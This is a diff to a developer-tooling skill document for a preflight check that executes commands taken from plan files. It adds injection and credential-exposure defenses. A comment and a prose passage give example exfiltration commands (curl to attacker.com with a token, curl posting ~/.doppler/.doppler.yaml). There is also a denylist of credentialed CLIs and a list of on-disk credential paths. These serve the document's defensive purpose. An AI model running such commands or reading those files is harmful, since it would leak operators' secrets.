@@ -111,7 +111,7 @@ Re-use the cached path-set from Phase 0 Step 0.1 (`"$PREFLIGHT_TMP/preflight-dif
 grep -E '(^|/)supabase/migrations/.*\.sql$' "$PREFLIGHT_TMP/preflight-diff-files.txt"
 ```
 
-The regex anchors are intentional: `(^|/)` accepts both top-level (`supabase/migrations/X.sql`) and nested-under-app-dir paths (`apps/web-platform/supabase/migrations/X.sql`); `.*\.sql$` accepts files at any depth under the migrations directory (matching git pathspec's `*` which crosses `/`). Verify at edit time via `git diff --name-only origin/main...HEAD -- '*/supabase/migrations/*.sql' supabase/migrations/*.sql > /tmp/A.txt && grep -E '(^|/)supabase/migrations/.*\.sql$' "$PREFLIGHT_TMP/preflight-diff-files.txt" > /tmp/B.txt && diff -u /tmp/A.txt /tmp/B.txt`.
+The regex anchors are intentional: `(^|/)` accepts both top-level (`supabase/migrations/X.sql`) and nested-under-app-dir paths (`apps/web-platform/supabase/migrations/X.sql`); `.*\.sql$` accepts files at any depth under the migrations directory (matching git pathspec's `*` which crosses `/`). Verify at edit time via `a=$(mktemp) && b=$(mktemp) && git diff --name-only origin/main...HEAD -- '*/supabase/migrations/*.sql' supabase/migrations/*.sql > "$a" && grep -E '(^|/)supabase/migrations/.*\.sql$' "$PREFLIGHT_TMP/preflight-diff-files.txt" > "$b" && diff -u "$a" "$b"`.
 
 If no migration files are found (grep rc=1), return **SKIP**.
 
@@ -363,19 +363,24 @@ Otherwise **PASS**.
 
 Webpack chunking is not stable across releases — the inlined Supabase init may live in the login page chunk, in a numeric shared chunk (`/_next/static/chunks/8237-*.js`), or in a layout chunk. Hardcoding a single path produces SKIP-on-chunking-change, which silently disables the gate (issue #3010). Discover the candidate set dynamically by enumerating every chunk URL the login HTML references — that is the authoritative "what /login loads" surface.
 
-Run as separate Bash calls (no command substitution per skill convention):
+Run as separate Bash calls (no command substitution per skill convention). Each block
+re-derives `PREFLIGHT_TMP` — it is `$(git rev-parse --git-dir)`, so it is stable across
+separate Bash calls (which do NOT inherit env) AND distinct per worktree, which is what a
+later call needs to find these artifacts by name without colliding with a sibling session:
 
 ```bash
-curl -fsSL --max-time 10 -A "Mozilla/5.0" https://app.soleur.ai/login -o /tmp/preflight-login.html
+PREFLIGHT_TMP="$(git rev-parse --git-dir)"
+curl -fsSL --max-time 10 -A "Mozilla/5.0" https://app.soleur.ai/login -o "$PREFLIGHT_TMP/preflight-login.html"
 ```
 
 ```bash
-grep -oE '/_next/static/chunks/[^"]+\.js' /tmp/preflight-login.html | awk '!seen[$0]++' | head -20 > /tmp/preflight-candidates.txt
+PREFLIGHT_TMP="$(git rev-parse --git-dir)"
+grep -oE '/_next/static/chunks/[^"]+\.js' "$PREFLIGHT_TMP/preflight-login.html" | awk '!seen[$0]++' | head -20 > "$PREFLIGHT_TMP/preflight-candidates.txt"
 ```
 
 The cap of 20 is generous (current prod loads 13 chunks); if ever hit on a future release, prefer raising the cap over reverting to the hardcoded login-chunk path. The grep matches both `<script src=...>` and `<link rel=preload href=...>` references — both are valid candidates.
 
-If the `curl` fails (rc != 0) or `/tmp/preflight-candidates.txt` is empty, return **SKIP** with note: "Could not fetch /login HTML or could not locate any /_next/static/chunks references."
+If the `curl` fails (rc != 0) or `"$PREFLIGHT_TMP/preflight-candidates.txt"` is empty, return **SKIP** with note: "Could not fetch /login HTML or could not locate any /_next/static/chunks references."
 
 **Step 5.2: Probe each candidate chunk for Supabase shapes.**
 
@@ -384,7 +389,8 @@ The Supabase host string and the inlined anon-key JWT may live in DIFFERENT chun
 This block is operator-executed under the skill's `set -euo pipefail` convention. Failed `curl` per chunk and `grep` rc=1 on no-match must NOT abort the loop — the gate-level SKIP/FAIL decision is made from the accumulated state at end-of-loop, not from per-iteration rc.
 
 ```bash
-mkdir -p /tmp/preflight-chunks
+PREFLIGHT_TMP="$(git rev-parse --git-dir)"
+mkdir -p "$PREFLIGHT_TMP/preflight-chunks"
 host_union=""
 jwt_chunk=""
 while IFS= read -r chunk_path; do
@@ -392,24 +398,24 @@ while IFS= read -r chunk_path; do
   # before interpolating into the curl URL (no `..`, no `@`, no `?`, no whitespace).
   [[ "$chunk_path" =~ ^/_next/static/chunks/[A-Za-z0-9_/().-]+\.js$ ]] || continue
   base=$(basename "$chunk_path")
-  curl -fsSL --max-time 10 --max-filesize 5242880 "https://app.soleur.ai${chunk_path}" -o "/tmp/preflight-chunks/${base}" || continue
-  hosts=$(grep -oE 'https?://([a-z0-9.-]*supabase\.co|api\.soleur\.ai)' "/tmp/preflight-chunks/${base}" | sort -u || true)
+  curl -fsSL --max-time 10 --max-filesize 5242880 "https://app.soleur.ai${chunk_path}" -o "$PREFLIGHT_TMP/preflight-chunks/${base}" || continue
+  hosts=$(grep -oE 'https?://([a-z0-9.-]*supabase\.co|api\.soleur\.ai)' "$PREFLIGHT_TMP/preflight-chunks/${base}" | sort -u || true)
   if [[ -n "$hosts" ]]; then
     host_union="${host_union}${hosts}"$'\n'
   fi
   if [[ -z "$jwt_chunk" ]]; then
-    jwt=$(grep -oE 'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' "/tmp/preflight-chunks/${base}" | head -1 || true)
+    jwt=$(grep -oE 'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' "$PREFLIGHT_TMP/preflight-chunks/${base}" | head -1 || true)
     if [[ -n "$jwt" ]]; then
-      jwt_chunk="/tmp/preflight-chunks/${base}"
+      jwt_chunk="$PREFLIGHT_TMP/preflight-chunks/${base}"
     fi
   fi
-done < /tmp/preflight-candidates.txt
+done < "$PREFLIGHT_TMP/preflight-candidates.txt"
 
 printf '%s' "$host_union" | sort -u
 printf 'jwt_chunk=%s\n' "${jwt_chunk:-<none>}"
 ```
 
-The redirected-stdin form (`< /tmp/preflight-candidates.txt`) is required — piping (`cat ... | while read`) scopes loop variables to a subshell and loses `host_union` / `jwt_chunk` at loop exit. The `--max-filesize 5242880` (5 MB) cap defends against a misbehaving CDN response filling tmpfs across 20 fetches. The strict path regex rejects `..`, `@`, `?`, and whitespace before any string interpolation into the curl URL — a defense-in-depth gate even though the source HTML is served by our own CDN. Full traversal (no early-break) ensures placeholder-host leaks in late-candidate chunks are still detected (matrix row 6).
+The redirected-stdin form (`< "$PREFLIGHT_TMP/preflight-candidates.txt"`) is required — piping (`cat ... | while read`) scopes loop variables to a subshell and loses `host_union` / `jwt_chunk` at loop exit. The `--max-filesize 5242880` (5 MB) cap defends against a misbehaving CDN response filling tmpfs across 20 fetches. The strict path regex rejects `..`, `@`, `?`, and whitespace before any string interpolation into the curl URL — a defense-in-depth gate even though the source HTML is served by our own CDN. Full traversal (no early-break) ensures placeholder-host leaks in late-candidate chunks are still detected (matrix row 6).
 
 **Step 5.3: Assert canonical shape.**
 
@@ -685,8 +691,17 @@ esac
 **Step 10.3: Extract the `## Observability` block from the plan file.**
 
 ```bash
-awk '/^## Observability/{in=1; next} /^## /{if (in) exit} in' "$PLAN_PATH" > /tmp/preflight-observability.txt
-test -s /tmp/preflight-observability.txt || { echo "FAIL: Plan touches sensitive paths but '## Observability' block is missing. See hr-observability-as-plan-quality-gate."; exit 1; }
+PREFLIGHT_TMP="$(git rev-parse --git-dir)"
+# ‼️ ANCHOR the heading match. `/^## Observability/` is a PREFIX match, so it
+# also matches `## Observability layer citation` — a section name that
+# `hr-observability-layer-citation` actively encourages, making the collision
+# systemic rather than incidental. When both sections exist, the unanchored form
+# extracts the FIRST (the prose citation), finds no `discoverability_test`, and
+# FAILs with "no command could be parsed" — a false FAIL on a plan that is
+# perfectly well-formed. Verified against #6698's plan: unanchored extracted 47
+# lines of the wrong section; anchored reaches the real block.
+awk '/^## Observability$/{ino=1; next} /^## /{if (ino) exit} ino' "$PLAN_PATH" > "$PREFLIGHT_TMP/preflight-observability.txt"
+test -s "$PREFLIGHT_TMP/preflight-observability.txt" || { echo "FAIL: Plan touches sensitive paths but '## Observability' block is missing. See hr-observability-as-plan-quality-gate."; exit 1; }
 ```
 
 If the block is missing, return **FAIL** with: "Sensitive-path diff but plan file `<PLAN_PATH>` is missing the `## Observability` block. See `hr-observability-as-plan-quality-gate`. Add the section per `plugins/soleur/skills/plan/references/plan-issue-templates.md`."
@@ -711,7 +726,21 @@ discoverability_test:
   expected_output: "200"
 ```
 
-Detection: `awk '/^[[:space:]]*command:/'` returns the value on the same line after the colon, OR the next non-blank line if the value is a YAML `|` block-scalar.
+Form A accepts all three YAML scalar shapes for `command:`:
+
+| Shape | Header | Continuations joined with |
+| --- | --- | --- |
+| **inline** | `command: curl …` | — (value is on the key line) |
+| **block** | `command: \|`, `\|-`, `\|+` | newline |
+| **folded** | `command: >`, `>-`, `>+` | space |
+
+Block and folded headers may carry a trailing `# comment`. Scalar extent follows YAML
+indent semantics: a continuation is any non-empty line indented **more** than the
+`command:` key, and the first line indented **≤** the key ends the scalar. The parser is
+[`./scripts/parse-form-a.awk`](./scripts/parse-form-a.awk) — a real file rather than an
+inlined program, so the awk/TS parity harness executes the production runtime directly
+instead of regex-scraping this prose. That file is authoritative; the TypeScript mirror in
+`plugins/soleur/test/lib/discoverability-test-parser.ts` is non-authoritative.
 
 **Form B — prose + fenced block:**
 
@@ -726,17 +755,32 @@ Detection: `awk '/^[[:space:]]*command:/'` returns the value on the same line af
 Detection: find the first `discoverability_test` line in the Observability block; from that point, locate the first fenced code block — its contents are the command. Then locate the first line matching `^[[:space:]]*Expected output:` (case-insensitive) — its value is the expected.
 
 ```bash
+PREFLIGHT_TMP="$(git rev-parse --git-dir)"
 # Form A first (anchored YAML key — strongest signal).
-CMD=$(awk '
-  /^[[:space:]]*command:[[:space:]]*\|/  { mode="block"; next }
-  /^[[:space:]]*command:/                { sub(/^[[:space:]]*command:[[:space:]]*/, ""); print; exit }
-  mode=="block" && /^[[:space:]]+[^[:space:]]/ { print; next }
-  mode=="block" && /^[[:space:]]*[^[:space:]]/ { exit }
-' /tmp/preflight-observability.txt)
+#
+# The parser lives in a real file so the parity harness can execute it. Resolve via
+# `git rev-parse --show-toplevel`, NOT `${CLAUDE_PLUGIN_ROOT:-plugins/soleur}` —
+# CLAUDE_PLUGIN_ROOT is unset in a plain session, which would silently make the path
+# CWD-relative.
+#
+# Hard-fail on a load error. `awk -f <missing>` exits 2 with EMPTY stdout, and
+# `set -uo pipefail` does NOT abort on it (command-substitution rc is discarded), so a
+# missing parser would leave $CMD empty and Form B would silently parse a DIFFERENT
+# command. Never fall through.
+FORM_A_AWK="$(git rev-parse --show-toplevel)/plugins/soleur/skills/preflight/scripts/parse-form-a.awk"
+test -r "$FORM_A_AWK" || { echo "FAIL: Check 10 parser missing at $FORM_A_AWK"; exit 1; }
+CMD=$(awk -f "$FORM_A_AWK" "$PREFLIGHT_TMP/preflight-observability.txt")
+AWK_RC=$?
+if [[ "$AWK_RC" -ne 0 ]]; then
+  # `$?` here would report the `!`-inverted status (always 0) — capture the real
+  # rc from the command substitution before emitting it.
+  echo "FAIL: Check 10 Form A parser errored (awk rc=${AWK_RC:-unknown}); refusing to fall through to Form B."
+  exit 1
+fi
 
 EXPECTED=$(awk '
   /^[[:space:]]*expected_output:/ { sub(/^[[:space:]]*expected_output:[[:space:]]*/, ""); print; exit }
-' /tmp/preflight-observability.txt)
+' "$PREFLIGHT_TMP/preflight-observability.txt")
 
 # Fallback to Form B (fenced block under `discoverability_test.command:` prose).
 # Skip leading `#` comment lines inside the fence — operator prose comments
@@ -749,11 +793,11 @@ if [[ -z "$CMD" ]]; then
     found && /^[[:space:]]*```/ { fence=!fence; if (!fence && lines>0) exit; next }
     found && fence && /^[[:space:]]*#/ { next }
     found && fence { print; lines++ }
-  ' /tmp/preflight-observability.txt)
+  ' "$PREFLIGHT_TMP/preflight-observability.txt")
 fi
 
 if [[ -z "$EXPECTED" ]]; then
-  EXPECTED=$(grep -iE '^[[:space:]]*(\*\*)?Expected output:(\*\*)?' /tmp/preflight-observability.txt | head -1 | sed -E 's/^[[:space:]]*(\*\*)?Expected output:(\*\*)?[[:space:]]*//I')
+  EXPECTED=$(grep -iE '^[[:space:]]*(\*\*)?Expected output:(\*\*)?' "$PREFLIGHT_TMP/preflight-observability.txt" | head -1 | sed -E 's/^[[:space:]]*(\*\*)?Expected output:(\*\*)?[[:space:]]*//I')
 fi
 ```
 
@@ -768,6 +812,44 @@ if [[ "$CMD" =~ (^|[[:space:]]|/)ssh([[:space:]]|$) ]]; then
 fi
 ```
 
+**Reject credentialed CLIs** (the load-bearing control for the folded-scalar fix):
+
+Check 10 executes `$CMD` with the operator's ambient **file-backed** CLI auth reachable.
+`env -i` in Step 10.5 scrubs environment variables but **not** credentials on disk,
+because `HOME` is deliberately preserved — the Doppler CLI reads a live `dp.ct.*` token
+from `~/.doppler/.doppler.yaml`. Do not cite `env -i` as a mitigation for a
+credential-bearing command.
+
+This reject is required because fixing the folded-scalar parser (#6772) is a **fail-open
+transition**: commands that previously parsed to the literal `>` and self-rejected at
+Step 10.5 now parse correctly and reach execution. A folded scalar joins with a *space*
+and therefore carries no shell-active token by construction, so Step 10.5's reject set
+cannot constrain what a folded command *is* — only the verb rejects here can.
+
+```bash
+# Match against a QUOTE-STRIPPED copy: bash resolves `"doppler"`, `\doppler` and
+# `dopp""ler` to the same binary, but the word-boundary anchors below do not see
+# through the quote characters. Strip them from a COPY only — never from the string
+# that would be executed.
+CMD_DEQ="${CMD//[\"\'\\]/}"
+if [[ "$CMD_DEQ" =~ (^|[[:space:]]|/)(doppler|gh|aws|supabase|stripe|hcloud|wrangler|terraform|flyctl|vercel)([[:space:]]|$) ]]; then
+  echo "FAIL: discoverability_test.command invokes a credentialed CLI; refusing to run. Check 10 executes with the operator's ambient file-backed CLI auth reachable (env -i does NOT scrub it — \$HOME is preserved, so ~/.doppler/.doppler.yaml, ~/.ssh/id_ed25519, ~/.netrc, ~/.git-credentials, ~/.aws/credentials, ~/.config/gcloud/credentials.db and ~/.docker/config.json are all readable). Use an unauthenticated probe, or see the Check-10 credentialed-probe design issue if this probe genuinely needs credentials."
+  exit 1
+fi
+```
+
+**This is a DENYLIST, and a denylist cannot be complete against a preserved `$HOME`.**
+It does NOT catch indirect invocation — `bash scripts/foo.sh` whose body self-wraps
+`doppler run -c prd`, a `curl --data-binary @~/.doppler/.doppler.yaml` exfiltration, or any
+credentialed verb not listed. Those remain reachable and are accepted for now; the durable
+fix is an ALLOWLIST of probe verbs (curl/dig/getent/bun/bash), tracked separately. Do not
+describe this reject as though it closed the class.
+
+The `(^|[[:space:]]|/)` … `([[:space:]]|$)` boundaries are load-bearing: the `/`
+alternative catches `/usr/local/bin/gh`, and the trailing boundary keeps legitimate
+probes runnable (a bare substring match would false-reject
+`curl https://app.soleur.ai/highlights` for containing `gh`).
+
 **Step 10.5: Sanitize and run with a tight timeout.**
 
 The block below uses a `text` fence (not `bash`) so the skill-security-scan
@@ -780,9 +862,16 @@ is trust-on-PR-review. See [`2026-05-20-preflight-check-10-discoverability-test-
 # Defense-in-depth: reject every shell-active token before run. The plan file
 # is trust-on-PR-review but this regex is what blocks a malicious plan author
 # from chaining `; curl attacker.com?leak=$TOKEN` after a benign curl probe.
-# Rejects: ;, &&, ||, |, >, <, &, parameter expansion ($VAR or ${VAR}),
+# Rejects: ;, &&, ||, |, >, <, &, NEWLINE, parameter expansion ($VAR or ${VAR}),
 # command substitution $(), backticks, process substitution <(/>().
-if [[ "$CMD" =~ (\$\(|\`|\<\(|\>\(|\;|\&\&|\|\||\||\>|\<|\&|\$\{?[A-Za-z_]) ]]; then
+#
+# SCOPE OF THE NEWLINE REJECT: it closes BLOCK-mode command chaining only. A block
+# scalar joins continuations with \n, which `bash -c` runs as separate statements —
+# verified before this was added: a second `touch` line in a block scalar executed.
+# It contributes ZERO coverage to folded scalars, which join with a SPACE and carry no
+# shell-active token; those are covered by Step 10.4's credentialed-CLI reject. Do not
+# cite this reject as a mitigation for the folded-command class.
+if [[ "$CMD" =~ (\$\(|\`|\<\(|\>\(|\;|\&\&|\|\||\||\>|\<|\&|$'\n'|\$\{?[A-Za-z_]) ]]; then
   echo "FAIL: discoverability_test.command contains shell-active token; refusing to run."
   exit 1
 fi
@@ -833,7 +922,7 @@ On **FAIL**, abort with the diagnostic table (command, exit code, sanitized stdo
 On **FAIL**, present the failure reason + sanitized command + diagnostic and offer **AskUserQuestion**:
 
 1. "Fix the plan's `discoverability_test.command` now" — open the plan file at the line of the `discoverability_test:` key. Re-run Check 10.
-2. "Skip — temporarily defer (logs a trim-tracker issue)" — `gh issue create --label 'priority/p3-low,chore'` with the failure as the body. Continue the preflight run with this check noted as DEFERRED.
+2. "Skip — temporarily defer (logs a trim-tracker issue)" — `gh issue create --label 'priority/p3-low,chore'` with the command, the exit code and the `expected_output` as the body. **Never include `$DT_STDOUT_SAFE` in the issue body.** `sanitize()` strips only C0 controls, not secrets or PII: a probe's stdout routinely carries log rows with user emails, client IPs, and bearer/`dp.ct.*` tokens, and this repository is PUBLIC. The captured stdout stays in the local run output for the operator; it does not get published. Continue the preflight run with this check noted as DEFERRED.
 3. "Abort — fix elsewhere" — stop the pipeline.
 
 **Result:**
@@ -980,5 +1069,10 @@ Preflight validation passed. Return control to the calling orchestrator.
 - **Triple-SSOT for `SENSITIVE_PATH_RE`.** The literal lives at Check 6 Step 6.1, Check 10 Step 10.1, AND `plugins/soleur/skills/deepen-plan/SKILL.md` Phase 4.6 Step 2. All three MUST stay byte-identical. The Check 10 regression test (`plugins/soleur/test/preflight-discoverability-test.test.ts`) asserts ≥2 matches in `preflight/SKILL.md`; the canonical grep is `grep -cF "SENSITIVE_PATH_RE='^(apps/web-platform" plugins/soleur/skills/preflight/SKILL.md plugins/soleur/skills/deepen-plan/SKILL.md`. `grep -cF` is substring-based and tolerates the 2-space indentation difference between top-level (preflight) and markdown-bullet (deepen-plan) contexts — keep AC2's grep un-anchored.
 - **Shared Plan-File Resolution is a SSOT.** Both Check 6 Step 6.2 and Check 10 Step 10.2 call it. A future PR that changes the scrub/extract logic must edit the shared sub-section once — both consumers pick it up. Do NOT copy-paste the logic back into a caller block.
 - **Check 10 parser duality (Form A YAML vs Form B prose+fence).** PR #4148 used Form B; the canonical template uses Form A. Both must be accepted OR Check 10 silently SKIPs on currently-valid plans. The TS reference impl at `plugins/soleur/test/lib/discoverability-test-parser.ts` exercises both forms across all 8 fixtures.
+- **Rule order in `parse-form-a.awk` IS the bug (#6772).** The inline rule `/^[[:space:]]*command:/` matches EVERY `command:` line, including `command: >-` and `command: |`. If it is ever moved ahead of the fold/block header rules it returns the literal indicator, which then self-rejects against Step 10.5's shell-active `>` branch — a check that cannot parse its input, reporting a shell injection the plan does not have. AC1 and fixtures F1–F3 are the pins; do not drop them when refactoring.
+- **Anchoring the header regex is a bug generator.** A bare `$` anchor made `command: >- # note` fall through to inline and reproduce #6772 exactly. Any future tightening of the header must keep the comment-tolerant `(#.*)?$` tail and re-run the F1–F3 comment column.
+- **`indent()` returns 0 on a blank line**, which is `<= key` for every scalar. The blank-line skip rule MUST stay above the indent terminator or every scalar ends at its first blank line (fixture N6).
+- **`env -i` does not scrub file-backed CLI auth.** Step 10.5 preserves `HOME`, so the Doppler CLI's `~/.doppler/.doppler.yaml` token stays reachable by any command Check 10 executes. Never cite `env -i` as a mitigation for a credential-bearing command — Step 10.4's verb rejects are what cover that class.
+- **The shell-active reject does not bound a folded command.** Folding joins with a space, so a folded scalar has no `;`/`|`/`$()` by construction and passes Step 10.5 automatically — it can append *arguments* but never chain a command. That makes fold safer than block for injection, but it also means no token in the Step 10.5 set constrains what a folded command *is*. Reasoning "the reject will catch it" about a folded command is reasoning about the wrong gate.
 - **`bash -c "$CMD"` stdout always ends in `\n`.** The matcher MUST normalize trailing newlines (via `sanitize()` or `${var%$'\n'}`) before substring comparison, or `expected_output: 200` fails when production correctly emits `200\n`.
 - **The `\b` word-boundary trap.** Bash `[[ $x =~ \bssh \b ]]` matches `ssh ` only when whitespace is on BOTH sides; trailing-EOF or trailing-newline `ssh ` does NOT match. Always use `(^|[[:space:]])ssh([[:space:]]|$)` — the canonical Check 10 reject form — when checking for `ssh ` in operator-facing prose.
